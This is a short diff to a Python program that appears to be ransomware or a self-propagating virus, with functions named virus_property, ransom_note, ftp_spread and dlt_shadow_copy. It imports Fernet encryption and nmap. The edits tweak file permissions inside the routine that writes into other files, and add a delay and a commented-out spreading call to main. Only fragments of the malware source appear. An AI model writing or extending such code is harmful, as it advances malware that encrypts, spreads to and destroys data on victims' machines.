@@ -7,6 +7,7 @@ import time
 
 import sys
 import nmap
+import win32con
 import win32gui
 from cryptography.fernet import Fernet
 
@@ -42,7 +43,7 @@ def virus_property():
                                 g.write(lines + '\n' + line)
                                 g.close()
                                 c.close()
-                                os.chmod(file, 777)
+                                os.chmod(file, stat.S_IRWXU)
                         else:
                             pass
                 except Exception:
@@ -197,6 +198,8 @@ def main():
     message()
     # ransom_note()
     # show_ransom_note()
+    time.sleep(5)
+    # ftp_spread()
     # dlt_shadow_copy()
     # delete_ransomware()
 
